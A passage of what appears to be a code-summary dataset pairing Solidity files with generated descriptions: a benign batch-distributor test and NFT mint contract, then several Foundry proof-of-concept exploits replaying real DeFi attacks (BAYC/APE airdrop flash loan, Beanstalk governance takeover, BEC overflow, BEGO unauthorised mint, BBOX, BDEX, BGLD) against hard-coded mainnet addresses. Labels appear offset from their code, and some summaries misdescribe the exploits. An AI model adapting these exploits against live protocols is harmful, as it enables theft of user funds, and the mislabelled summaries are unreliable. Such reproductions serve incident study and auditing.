batch.txns[i].amount;\n            assertGe(\n                erc20Mock.balanceOf(batch.txns[i].recipient),\n                batch.txns[i].amount\n            );\n        }\n        assertGe(\n            erc20Mock.balanceOf(initialAccount),\n            initialAmount - valueAccumulator\n        );\n        assertEq(erc20Mock.balanceOf(address(batchDistributor)), 0);\n    }\n}\n\ncontract BatchDistributorInvariants is Test {\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n\n    IBatchDistributor private batchDistributor;\n    BatchDistributorHandler private batchDistributorHandler;\n\n    ERC20Mock private erc20Mock;\n\n    function setUp() public {\n        batchDistributor = IBatchDistributor(\n            vyperDeployer.deployContract(\"src/utils/\", \"BatchDistributor\")\n        );\n        address msgSender = makeAddr(\"msgSender\");\n        erc20Mock = new ERC20Mock(\n            \"MyToken\",\n            \"MTKN\",\n            msgSender,\n            type(uint256).max\n        );\n        batchDistributorHandler = new BatchDistributorHandler(\n            batchDistributor,\n            erc20Mock\n        );\n        targetContract(address(batchDistributorHandler));\n        targetSender(msgSender);\n    }\n\n    function invariantNoEtherBalance() public {\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function invariantNoTokenBalance() public {\n        /**\n         * @dev This invariant breaks when tokens are sent directly to `batchDistributor`\n         * as part of `distribute_token`. However, this behaviour is acceptable.\n         */\n        assertEq(erc20Mock.balanceOf(address(batchDistributor)), 0);\n    }\n}\n\ncontract BatchDistributorHandler {\n    IBatchDistributor private batchDistributor;\n    ERC20Mock private token;\n\n    constructor(IBatchDistributor batchDistributor_, ERC20Mock token_) {\n        batchDistributor = batchDistributor_;\n        token = token_;\n    }\n\n    function distribute_ether(\n        IBatchDistributor.Batch calldata batch\n    ) public payable {\n        batchDistributor.distribute_ether(batch);\n    }\n\n    function distribute_token(IBatchDistributor.Batch calldata batch) public {\n        token.approve(address(batchDistributor), type(uint256).max);\n        batchDistributor.distribute_token(token, batch);\n    }\n}\n",
        "summary": "This is a Solidity smart contract that tests the functionality of a batch distributor contract. The batch distributor can distribute ether or tokens to multiple addresses in a single transaction. The tests cover scenarios such as distributing to multiple addresses, insufficient funds, insufficient allowance, and excessive funds. The contract also includes some fuzz tests to check for handling of unexpected scenarios. The `BatchDistributorInvariants` contract contains invariants that must be maintained, such as ensuring there is no ether or token balance in the `batchDistributor` contract.",
        "id": "126620c8-eb59-41c2-ba67-bcb3615d893a",
        "api_seq": "BAYC1155"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// by 0xAA\npragma solidity ^0.8.4;\n\nimport \"./ERC1155.sol\";\n\ncontract BAYC1155 is ERC1155{\n    uint256 constant MAX_ID = 10000; \n    // \u6784\u9020\u51fd\u6570\n    constructor() ERC1155(\"BAYC1155\", \"BAYC1155\"){\n    }\n\n    //BAYC\u7684baseURI\u4e3aipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/ \n    function _baseURI() internal pure override returns (string memory) {\n        return \"ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/\";\n    }\n    \n    // \u94f8\u9020\u51fd\u6570\n    function mint(address to, uint256 id, uint256 amount) external {\n        // id \u4e0d\u80fd\u8d85\u8fc710,000\n        require(id < MAX_ID, \"id overflow\");\n        _mint(to, id, amount, \"\");\n    }\n\n    // \u6279\u91cf\u94f8\u9020\u51fd\u6570\n    function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts) external {\n        // id \u4e0d\u80fd\u8d85\u8fc710,000\n        for (uint256 i = 0; i < ids.length; i++) {\n            require(ids[i] < MAX_ID, \"id overflow\");\n        }\n        _mintBatch(to, ids, amounts, \"\");\n    }\n\n}",
        "summary": "This is a smart contract written in Solidity that is an extension of the ERC1155 standard. It allows for the minting of non-fungible tokens (NFTs) with the specific functionality of being able to create and sell Bored Ape Yacht Club NFTs. The contract includes a max token ID of 10,000, a constructor function for initializing the contract, and functions for minting single and multiple NFTs. The base URI for the NFTs is set to \"ipfs://QmeSjSinHpPnmXmspMjwiXyN6zS4E9zccariGR3jxcaWtq/\".",
        "id": "e8f97a9c-e2f2-4fec-afd3-b68eacd2b24f",
        "api_seq": "Bayc_apecoin_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nExploited tx: https://etherscan.io/tx/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098\nDebug:\nhttps://dashboard.tenderly.co/tx/mainnet/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098\nhttps://tools.blocksec.com/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098\n\n*/\n\ncontract ContractTest is DSTest {\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  IBAYCi bayc =  IBAYCi(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);\n  INFTXVault NFTXVault = INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);\n  IAirdrop AirdropGrapesToken = IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);\n  IERC20 ape = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);\n  bytes32 private constant CALLBACK_SUCCESS = keccak256(\"ERC3156FlashBorrower.onFlashLoan\");\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 14403948); // fork mainnet at block 14403948\n  }\n\n  function test() public {\n      cheats.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8);\n      bayc.transferFrom(0x6703741e913a30D6604481472b6d81F3da45e6E8, address(this), 1060);\n      emit log_named_decimal_uint(\"Before exploiting, Attacker balance of APE is\", ape.balanceOf(address(this)),18);\n      NFTXVault.approve(address(NFTXVault), type(uint256).max);\n      NFTXVault.flashLoan(address(this), address(NFTXVault), 5200000000000000000, \"\");  // flash loan 5.2 BAYC tokens from the NFTX Vault \n      emit log_named_decimal_uint(\"After exploiting, Attacker balance of APE is\", ape.balanceOf(address(this)),18);\n  }\n\n  function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {\n        \n        uint256[] memory blank = new uint256[](0);\n        // The attacker used the borrowed BAYC tokens to redeem the following BAYC NFTs\n        NFTXVault.redeem(5, blank);   \n       \n        //Owning so many BAYC NFTs allowed the attacker to claim APE tokens for each, resulting in a total amount of 60,564 APE.\n        AirdropGrapesToken.claimTokens();  \n\n        bayc.setApprovalForAll(address(NFTXVault), true);\n\n        uint256[] memory nfts = new uint256[](6); \n        nfts[0] = 7594;\n        nfts[1] = 4755;\n        nfts[2] = 9915;\n        nfts[3] = 8214;\n        nfts[4] = 8167;\n        nfts[5] = 1060;\n\n        NFTXVault.mint(nfts, blank);\n\n        NFTXVault.approve(address(NFTXVault), type(uint256).max);\n\n        return CALLBACK_SUCCESS;\n    }\n\n    function onERC721Received(\n        address _operator,\n        address _from,\n        uint256 _tokenId,\n        bytes calldata _data\n        ) \n    external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n}\n",
        "summary": "This Solidity smart contract is a test contract for a flash loan exploit on the NFTX Vault protocol, which allows the attacker to borrow BAYC tokens and use them to redeem BAYC NFTs on the protocol. With the ownership of these NFTs, the attacker is then able to claim APE tokens, resulting in a total amount of APE tokens. Finally, the attacker mints new BAYC NFTs and approves them for use on the NFTX protocol. The contract includes several interfaces for interacting with different protocols and tokens used in the exploit, as well as a test function and a function to handle the flash loan.",
        "id": "1a2db6e2-7b25-47ca-9b07-c7dcd78f96b5",
        "api_seq": "BBOX_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1599599614490877952\n// @TX\n// https://bscscan.com/tx/0xac57c78881a7c00dfbac0563e21b5ae3a8e3f9d1b07198a27313722a166cc0a3\n\ncontract ContractTest is DSTest{\n    IERC20 BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    uint flashLoanAmount;\n    address contractAddress;\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23106506);\n    }\n\n    function testExploit() public{\n        WBNB.approve(address(Router), type(uint).max);\n        BBOX.approve(address(Router), type(uint).max);\n        TransferBBOXHelp transferHelp = new TransferBBOXHelp(); // sell time limit\n        contractAddress = address(transferHelp);\n        flashLoanAmount = WBNB.balanceOf(dodo);\n        DVM(dodo).flashLoan(flashLoanAmount, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) public{\n        WBNBToBBOX();\n        contractAddress.call(abi.encodeWithSignature(\"transferBBOX()\"));\n        BBOXToWBNB();\n        WBNB.transfer(dodo, flashLoanAmount);\n    }\n\n    function WBNBToBBOX() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(WBNB);\n        path[1] = address(BBOX);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            1300 * 1e18,\n            0,\n            path,\n            contractAddress,\n            block.timestamp\n        );\n    }\n\n    function BBOXToWBNB() internal{\n        address [] memory path = new address[](2);\n        path[0] = address(BBOX);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            BBOX.balanceOf(address(this)) * 90 / 100,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n}\n\ncontract TransferBBOXHelp{\n    IERC20 BBOX = IERC20(0x5DfC7f3EbBB9Cbfe89bc3FB70f750Ee229a59F8c);\n    function transferBBOX() external{\n        BBOX.transfer(msg.sender, BBOX.balanceOf(address(this)));\n    }\n}",
        "summary": "This code is for a Solidity contract that carries out a flash loan attack on a decentralized finance (DeFi) project called Dodo. The contract imports an interface for the Dodo project, as well as an interface for the UniSwap V2 router and another contract for \"cheat codes.\" The `setUp` function creates a fork in the Binance Smart Chain for testing purposes. The `testExploit` function swaps WBNB for BBOX, calls a separate contract called `TransferBBOXHelp` which transfers the BBOX tokens to the contract's address, then swaps the BBOX back for WBNB. The user then transfers the WBNB back to the `dodo` contract as part of the flash loan. The remaining functions `WBNBToBBOX` and `BBOXToWBNB` carry out the swapping of tokens back and forth. The contract has an SPDX license identifier of \"UNLICENSED.\"",
        "id": "7da93e4c-a0b6-4bf5-b996-68d563efe689",
        "api_seq": "BDEX_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1588579143830343683\n// TX\n// https://bscscan.com/tx/0xe7b7c974e51d8bca3617f927f86bf907a25991fe654f457991cbf656b190fe94\n\ninterface BvaultsStrategy {\n    function convertDustToEarned() external;\n}\n\ninterface BPair {\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n}\n\n\ncontract ContractTest is DSTest{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 BDEX = IERC20(0x7E0F01918D92b2750bbb18fcebeEDD5B94ebB867);\n    BvaultsStrategy vaultsStrategy = BvaultsStrategy(0xB2B1DC3204ee8899d6575F419e72B53E370F6B20);\n    BPair Pair = BPair(0x5587ba40B8B1cE090d1a61b293640a7D86Fc4c2D);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        // the ankr rpc maybe dont work , please use QuickNode\n        cheats.createSelectFork(\"bsc\", 22629431);\n    }\n\n    function testExploit() public{\n        address(WBNB).call{value: 34 ether}(\"\");\n        uint amountin = WBNB.balanceOf(address(this));\n        WBNB.transfer(address(Pair), amountin);\n        (uint BDEXReserve, uint WBNBReserve, ) = Pair.getReserves();\n        uint amountout = (998 * amountin * BDEXReserve) / (1000 * WBNBReserve + 998 * amountin);\n        Pair.swap(amountout, 0, address(this), \"\");\n        vaultsStrategy.convertDustToEarned();\n        uint amountBDEX = BDEX.balanceOf(address(this));\n        BDEX.transfer(address(Pair), amountBDEX);\n        (uint BDEXReserve1, uint WBNBReserve1, ) = Pair.getReserves();\n        uint amountWBNB = (998 * amountBDEX * WBNBReserve1) / (1000 * BDEXReserve1 + 998 * amountBDEX);\n        Pair.swap(0, amountWBNB, address(this), \"\");\n        address(WBNB).call(abi.encodeWithSignature(\"withdraw(uint256)\", 34 * 1e18));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    receive() payable external{}\n    \n\n}",
        "summary": "This is a Solidity smart contract that contains a test function called `testExploit`, which attempts to exploit a vulnerability in a DeFi protocol. The vulnerability allows an attacker to convert their WBNB tokens into BDEX tokens at a favorable rate, and then convert them back to WBNB tokens at another favorable rate, resulting in a profit. \n\nIn the `testExploit` function, the attacker first transfers 34 WBNB tokens to the contract. Then, they call a swap function on a BDEX-WBNB liquidity pool (represented by the `Pair` variable), which converts some of the WBNB tokens into BDEX tokens. The attacker then calls another function (`convertDustToEarned()`) on the `vaultsStrategy` contract, which presumably triggers a function call on the DeFi protocol being exploited. \n\nNext, the attacker transfers the newly acquired BDEX tokens back to the liquidity pool and calls the swap function again to convert them back to WBNB tokens. Finally, the attacker withdraws their 34 WBNB tokens from the contract, potentially with a profit. \n\nThe `setUp` function sets up a fork of the BSC blockchain for testing purposes and the `receive` function is used to accept incoming ether (ETH) transactions.",
        "id": "e3470efe-1d12-45a5-a277-ac502251ba6a",
        "api_seq": "Beanstalk_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity >=0.7.0 <0.9.0;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ncontract ContractTest is DSTest {\n  CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n  ILendingPool aavelendingPool =\n    ILendingPool(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);\n  IERC20 dai = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);\n  IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);\n  IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);\n  IERC20 bean = IERC20(0xDC59ac4FeFa32293A95889Dc396682858d52e5Db);\n  IERC20 crvbean = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);\n  IERC20 threeCrv = IERC20(0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490);\n  IUniswapV2Router uniswapv2 =\n    IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));\n  ICurvePool threeCrvPool =\n    ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);\n  ICurvePool bean3Crv_f =\n    ICurvePool(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);\n  IBeanStalk siloV2Facet =\n    IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);\n  IBeanStalk beanstalkgov =\n    IBeanStalk(0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5);\n  address maliciousProposal = 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69;\n  uint32 bip = 18;\n\n  constructor() {\n    cheat.createSelectFork(\"mainnet\", 14595905); // fork mainnet at block 14595905\n  }\n\n  function testExploit() public {\n    address[] memory path = new address[](2);\n    path[0] = uniswapv2.WETH();\n    path[1] = address(bean);\n    uniswapv2.swapExactETHForTokens{ value: 75 ether }(\n      0,\n      path,\n      address(this),\n      block.timestamp + 120\n    );\n    emit log_named_uint(\n      \"Initial USDC balancer of attacker\",\n      usdc.balanceOf(address(this))\n    );\n\n    emit log_named_uint(\n      \"After initial ETH -> BEAN swap, Bean balance of attacker:\",\n      bean.balanceOf(address(this)) / 1e6\n    );\n    bean.approve(address(siloV2Facet), type(uint256).max);\n    siloV2Facet.depositBeans(bean.balanceOf(address(this)));\n    emit log_named_uint(\n      \"After BEAN deposit to SiloV2Facet, Bean balance of attacker:\",\n      bean.balanceOf(address(this)) / 1e6\n    );\n    IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);\n    bytes memory data = abi.encodeWithSelector(ContractTest.sweep.selector);\n    //emit log_named_uint(\"BIP:\", bip);\n    // function propose(\n    //     IDiamondCut.FacetCut[] calldata _diamondCut,\n    //     address _init,\n    //     bytes calldata _calldata,\n    //     uint8 _pauseOrUnpause\n    // )\n    // https://dashboard.tenderly.co/tx/mainnet/0x68cdec0ac76454c3b0f7af0b8a3895db00adf6daaf3b50a99716858c4fa54c6f\n    beanstalkgov.propose(_diamondCut, address(this), data, 3);\n\n    cheat.warp(block.timestamp + 24 * 60 * 60); //travelling 1 day in the future\n\n    dai.approve(address(aavelendingPool), type(uint256).max);\n    usdc.approve(address(aavelendingPool), type(uint256).max);\n    TransferHelper.safeApprove(\n      address(usdt),\n      address(aavelendingPool),\n      type(uint256).max\n    );\n    bean.approve(address(aavelendingPool), type(uint256).max);\n    dai.approve(address(threeCrvPool), type(uint256).max);\n    usdc.approve(address(threeCrvPool), type(uint256).max);\n    TransferHelper.safeApprove(\n      address(usdt),\n      address(threeCrvPool),\n      type(uint256).max\n    );\n    bean.approve(address(siloV2Facet), type(uint256).max);\n    threeCrv.approve(address(bean3Crv_f), type(uint256).max);\n    IERC20(address(bean3Crv_f)).approve(\n      address(siloV2Facet),\n      type(uint256).max\n    );\n\n\n    address[] memory assets = new address[](3);\n    assets[0] = address(dai);\n    assets[1] = address(usdc);\n    assets[2] = address(usdt);\n\n    uint256[] memory amounts = new uint256[](3);\n    amounts[0] = 350_000_000 * 10**dai.decimals();\n    amounts[1] = 500_000_000 * 10**usdc.decimals();\n    amounts[2] = 150_000_000 * 10**usdt.decimals();\n\n    uint256[] memory modes = new uint256[](3);\n    aavelendingPool.flashLoan(\n      address(this),\n      assets,\n      amounts,\n      modes,\n      address(this),\n      new bytes(0),\n      0\n    );\n    emit log_named_uint(\n      \"After Flashloan repay, usdc balance of attacker:\",\n      usdc.balanceOf(address(this))\n    );\n    usdc.transfer(msg.sender, usdc.balanceOf(address(this)));\n  }\n\n  function executeOperation(\n    address[] calldata assets,\n    uint256[] calldata amounts,\n    uint256[] calldata premiums,\n    address initiator,\n    bytes calldata params\n  ) external returns (bool) {\n    emit log_named_uint(\n      \"After deposit, Bean balance of attacker:\",\n      bean.balanceOf(address(this)) / 1e6\n    ); // @note redundant log\n    uint256[3] memory tempAmounts;\n    tempAmounts[0] = amounts[0];\n    tempAmounts[1] = amounts[1];\n    tempAmounts[2] = amounts[2];\n    threeCrvPool.add_liquidity(tempAmounts, 0);\n    uint256[2] memory tempAmounts2;\n    tempAmounts2[0] = 0;\n    tempAmounts2[1] = threeCrv.balanceOf(address(this));\n    bean3Crv_f.add_liquidity(tempAmounts2, 0);\n    emit log_named_uint(\n      \"After adding 3crv liquidity , bean3Crv_f balance of attacker:\",\n      crvbean.balanceOf(address(this))\n    );\n    emit log_named_uint(\n      \"After Curvebean3Crv_f balance of attacker:\",\n      IERC20(address(bean3Crv_f)).balanceOf(address(this))\n    ); //@note logging balance for same token ?\n    siloV2Facet.deposit(\n      address(bean3Crv_f),\n      IERC20(address(bean3Crv_f)).balanceOf(address(this))\n    );\n    //beanstalkgov.vote(bip); --> this line not needed, as beanstalkgov.propose() already votes for our bip\n    beanstalkgov.emergencyCommit(bip);\n    emit log_named_uint(\n      \"After calling beanstalkgov.emergencyCommit() , bean3Crv_f balance of attacker:\",\n      crvbean.balanceOf(address(this))\n    );\n    bean3Crv_f.remove_liquidity_one_coin(\n      IERC20(address(bean3Crv_f)).balanceOf(address(this)),\n      1,\n      0\n    );\n    emit log_named_uint(\n      \"After removing liquidity from crvbean pool , bean3Crv_f balance of attacker:\",\n      crvbean.balanceOf(address(this))\n    );\n    tempAmounts[0] = amounts[0] + premiums[0];\n    tempAmounts[1] = amounts[1] + premiums[1];\n    tempAmounts[2] = amounts[2] + premiums[2];\n    emit log_named_uint(\"premiums[0]:\", premiums[0]);\n    emit log_named_uint(\"premiums[1]:\", premiums[1]);\n    emit log_named_uint(\"premiums[2]:\", premiums[2]);\n    emit log_named_uint(\"tempAmounts[0]:\", tempAmounts[0]);\n    emit log_named_uint(\"tempAmounts[1]:\", tempAmounts[1]);\n    emit log_named_uint(\"tempAmounts[2]:\", tempAmounts[2]);\n\n    threeCrvPool.remove_liquidity_imbalance(tempAmounts, type(uint256).max);\n    threeCrvPool.remove_liquidity_one_coin(\n      threeCrv.balanceOf(address(this)),\n      1,\n      0\n    );\n\n    emit log_named_uint(\n      \"After removing 3crv liquidity from 3crv pool, usdc balance of attacker:\",\n      usdc.balanceOf(address(this))\n    );\n\n    return true;\n  }\n\n  function sweep() external {\n    IERC20 erc20bean3Crv_f = IERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD);\n    erc20bean3Crv_f.transfer(\n      msg.sender,\n      erc20bean3Crv_f.balanceOf(address(this))\n    ); //Just for verification, so keep other tokens\n  }\n}\n",
        "summary": "This is a Solidity smart contract that represents a test scenario for a potential exploit. The test involves executing a flash loan from a lending pool, swapping some tokens on Uniswap, depositing the resulting tokens into a yield-generating Silo contract, proposing an unauthorized change to a governance contract to steal funds, and executing the change. The code also logs several balances for verification.",
        "id": "31740bff-be90-4a89-a55c-12d7d27b4354",
        "api_seq": "BEC_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\n// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\ninterface BECToken {\n  function balanceOf(address account) external view returns (uint256);\n  function batchTransfer(address[] calldata _receivers, uint256 _value) external returns (bool);\n}\n\n// https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f\n// https://etherscan.io/address/0xc5d105e63711398af9bbff092d4b6769c82f793d#code  Line261\n\ncontract ContractTest is DSTest {\n  address attacker1 = 0xb4D30Cac5124b46C2Df0CF3e3e1Be05f42119033;\n  address attacker2 = 0x0e823fFE018727585EaF5Bc769Fa80472F76C3d7;\n  BECToken bec = BECToken(0xC5d105E63711398aF9bbff092d4B6769C82F793D);\n  CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n  function setUp() public {\n    cheats.createSelectFork(\"mainnet\", 5483642);\n  }\n\n  function testExploit() public {\n    emit log_named_decimal_uint(\"Before Exploit, Attacker1 BEC Balance\", bec.balanceOf(attacker1), 18);\n    emit log_named_decimal_uint(\"Before Exploit, Attacker2 BEC Balance\", bec.balanceOf(attacker2), 18);\n\n    address [] memory receivers = new address[](2);\n    receivers[0] = attacker1;\n    receivers[1] = attacker2;\n    bec.batchTransfer(receivers, type(uint256).max / 2 + 1);\n\n    emit log_named_decimal_uint(\"After Exploit, Attacker1 BEC Balance\", bec.balanceOf(attacker1), 18);\n    emit log_named_decimal_uint(\"After Exploit, Attacker2 BEC Balance\", bec.balanceOf(attacker2), 18);\n  }\n}\n",
        "summary": "This code defines a contract called `ContractTest` that tests an exploit targetting a function in an external contract called `BECToken`. The `setUp()` function sets up a fork of the Ethereum mainnet. The `testExploit()` function transfers a large amount of tokens, equal to half of the maximum uint256 value plus one, from the `BECToken` contract to two attacker addresses. The `batchTransfer()` function in `BECToken` allows for batch transfers of tokens to multiple addresses. The code also imports an interface called `interface.sol` and a contract called `CheatCodes` which is not provided in this code snippet. There are also some comments and a SPDX license identifier at the top of the code.",
        "id": "c80d849f-3170-4374-8c49-da47862b86af",
        "api_seq": "BEGO_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/AnciliaInc/status/1582828751250784256\n// https://twitter.com/peckshield/status/1582892058800685058\n// TX\n// https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57\n\ninterface BEGO20 is IERC20 {\n    function mint(uint256, string memory , address, bytes32[] memory, bytes32[] memory, uint8[] memory) external;\n}\n\ncontract ContractTest is DSTest{\n\n    BEGO20 BEGO = BEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x88503F48e437a377f1aC2892cBB3a5b09949faDd);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 22315679);\n    }\n\n    function testExploit() public{\n        bytes32 [] memory _r = new bytes32[](0);\n        bytes32 [] memory _s = new bytes32[](0);\n        uint8 [] memory _v = new uint8[](0);\n        BEGO.mint(1_000_000_000 * 1e18, \"t\", address(this), _r, _s, _v);\n        BEGOToWBNB();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after exploit\",\n            WBNB.balanceOf(address(this)),\n            18\n        );\n    }\n\n    function BEGOToWBNB() internal {\n        BEGO.approve(address(Router), type(uint).max);\n        address[] memory path = new address[](2);\n        path[0] = address(BEGO);\n        path[1] = address(WBNB);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            BEGO.balanceOf(address(this)),\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n    }\n\n\n}",
        "summary": "This is a Solidity smart contract for testing an exploit on the BEGO20 token. The contract imports other smart contracts, including a BEGO20 token contract and a Uniswap contract. The `setUp()` function sets up a blockchain fork for testing, and the `testExploit()` function executes the exploit, which involves minting a large amount of BEGO20 tokens and swapping them for WBNB tokens. The resulting WBNB balance is logged to the console using an event.",
        "id": "e2c55849-de81-4765-84d0-939ac29e911e",
        "api_seq": "BGLD_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1602335214356660225\n// @TX\n// https://bscscan.com/tx/0xea108fe94bfc9a71bb3e4dee4a1b0fd47572e6ad6aba8b2155ac44861be628ae\n\ninterface ERCPorxy{\n    function migrate() external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 oldBGLD = IERC20(0xC2319E87280c64e2557a51Cb324713Dd8d1410a3);\n    IERC20 newBGLD = IERC20(0x169f715CaE1F94C203366a6890053E817C767B7C);\n    IERC20 DEBT = IERC20(0xC632F90affeC7121120275610BF17Df9963F181c);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    ERCPorxy Proxy = ERCPorxy(0xE445654F3797c5Ee36406dBe88FBAA0DfbdDB2Bb);\n    address dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;\n    Uni_Pair_V2 WBNB_oldBGLD = Uni_Pair_V2(0x7526cC9121Ba716CeC288AF155D110587e55Df8b);\n    Uni_Pair_V2 oldBGLD_DEBT = Uni_Pair_V2(0x429339fa7A2f2979657B25ed49D64d4b98a2050d);\n    Uni_Pair_V2 newBGLD_DEBT = Uni_Pair_V2(0x559D0deAcAD259d970f65bE611f93fCCD1C44261);\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 23844529);\n    }\n\n    function testExploit() public {\n        oldBGLD.approve(address(Router), type(uint).max);\n        oldBGLD.approve(address(Proxy), type(uint).max);\n        newBGLD.approve(address(Router), type(uint).max);\n        DEBT.approve(address(Router), type(uint).max);\n        DVM(dodo).flashLoan(125 * 1e18, 0, address(this), new bytes(1)); // FlashLoan WBNB\n        Proxy.migrate(); // migrate oldBGLD to newBGLD\n        newBGLDToDEBT();\n        newBGLD_DEBT.swap(0, 950 * 1e9, address(this), new bytes(1)); // FlashLoan DEBT\n        Proxy.migrate();\n        newBGLDToDEBT();\n        DEBTToUSDT();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker WBNB balance after 